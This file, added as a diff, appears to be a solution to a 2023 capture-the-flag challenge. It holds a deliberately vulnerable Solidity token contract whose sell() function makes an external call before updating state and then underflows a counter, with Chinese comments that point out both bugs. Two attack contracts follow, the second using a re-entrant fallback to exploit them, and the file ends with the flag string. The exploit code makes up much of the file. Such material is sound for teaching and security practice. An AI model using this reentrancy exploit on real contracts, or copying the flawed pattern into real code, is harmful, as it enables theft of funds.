@@ -1,0 +1,178 @@
+ pragma solidity ^0.4.25;
+
+contract owned {
+    address public owner;
+
+    constructor ()
+        public {
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner {
+        require(msg.sender == owner);
+        _;
+    }
+
+    function transferOwnership(address newOwner) public
+        onlyOwner {
+        owner = newOwner;
+    }
+}
+
+contract magicChallenge is owned{
+    string public name;
+    string public symbol;
+    uint8 public decimals = 18;
+    uint256 public totalSupply;
+
+    bool public isSolve = false;
+
+    mapping (address => uint256) public balanceOf;
+    mapping (address => uint256) public sellTimes;
+    mapping (address => mapping (address => uint256)) public allowance;
+    mapping (address => bool) public winner;
+
+    event Transfer(address _from, address _to, uint256 _value);
+    event Burn(address _from, uint256 _value);
+    event Win(address _address,bool _win);
+
+
+    constructor () public {
+        totalSupply = 100 * 10 ** uint256(decimals);
+        balanceOf[address(this)] = totalSupply;
+        name = "token";
+        symbol = "TOKEN";
+    }
+
+    function _transfer(address _from, address _to, uint _value) internal {
+        require(_to != address(0x0));
+        require(_value > 0);
+
+        uint256 oldFromBalance = balanceOf[_from];
+        uint256 oldToBalance = balanceOf[_to];
+
+        uint256 newFromBalance =  balanceOf[_from] - _value;
+        uint256 newToBalance =  balanceOf[_to] + _value;
+
+        require(oldFromBalance >= _value);
+        require(newToBalance > oldToBalance);
+
+        balanceOf[_from] = newFromBalance;
+        balanceOf[_to] = newToBalance;
+
+        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));
+        emit Transfer(_from, _to, _value);
+    }
+
+    function transfer(address _to, uint256 _value) public returns (bool success) {
+        _transfer(msg.sender, _to, _value);
+        return true;
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
+        require(_value <= allowance[_from][msg.sender]);
+        allowance[_from][msg.sender] -= _value;
+        _transfer(_from, _to, _value);
+        return true;
+    }
+
+    function approve(address _spender, uint256 _value) public returns (bool success) {
+        allowance[msg.sender][_spender] = _value;
+        return true;
+    }
+
+    function burn(uint256 _value) public returns (bool success) {
+        require(balanceOf[msg.sender] >= _value);
+        balanceOf[msg.sender] -= _value;
+        totalSupply -= _value;
+        emit Burn(msg.sender, _value);
+        return true;
+    }
+
+    function balanceOf(address _address) public view returns (uint256 balance) {
+        return balanceOf[_address];
+    }
+
+    function buy() payable public returns (bool success){
+        require(balanceOf[msg.sender]==0);
+        require(msg.value == 1 wei);
+        _transfer(address(this), msg.sender, 1);
+        sellTimes[msg.sender] = 1;
+        return true;
+    }
+
+
+    function sell(uint256 _amount) public returns (bool success){
+        require(_amount >= 100);
+        require(sellTimes[msg.sender] > 0);
+        require(balanceOf[msg.sender] >= _amount);
+        require(address(this).balance >= _amount);
+        msg.sender.call.value(_amount)();//存在重入漏洞 使用重入使selltime溢出
+        _transfer(msg.sender, address(this), _amount);
+        sellTimes[msg.sender] -= 1;//存在溢出漏洞
+        return true;
+    }
+
+    function winnerSubmit() public returns (bool success){
+        require(winner[msg.sender] == false);
+        require(sellTimes[msg.sender] > 100);
+        winner[msg.sender] = true;
+        emit Win(msg.sender,true);
+        isSolve = true;
+        return true;
+    }
+
+    function kill(address _address) public onlyOwner {
+        selfdestruct(_address);
+    }
+
+    function getETHBalance() public view returns (uint256 ethBalance){
+        return address(this).balance;
+    }
+
+    function isSolved() public view returns(bool){
+        return isSolve == true;
+    }
+
+}
+contract att1
+{
+    magicChallenge public  m;
+    constructor (address add) public payable 
+    {
+        m=magicChallenge(add);
+    }
+    function a1(address add) public payable 
+    {
+        for(uint i=0;i<=50;i++)
+        {
+            m.buy.value(1)();
+            m.transfer(add,1);//将钱全转走使其他地址的balanceOf增加
+        }
+    }
+
+}//给m合约转账使m合约的balance快速增加
+contract att2
+{
+        magicChallenge public  m;
+    constructor (address add) public payable 
+    {
+        m=magicChallenge(add);
+        m.buy.value(1)();
+    }
+    function a2() public payable 
+    {
+        m.sell(100);
+    }
+function a3()
+{
+    m.winnerSubmit();
+}
+        function() external payable 
+        { 
+            if(address(m).balance>=100)
+        {
+            m.sell(100);
+        }
+        }//使用重入使selltime溢出
+}//flag: flag{complete_the_CSL_CTF_2023_autumn}
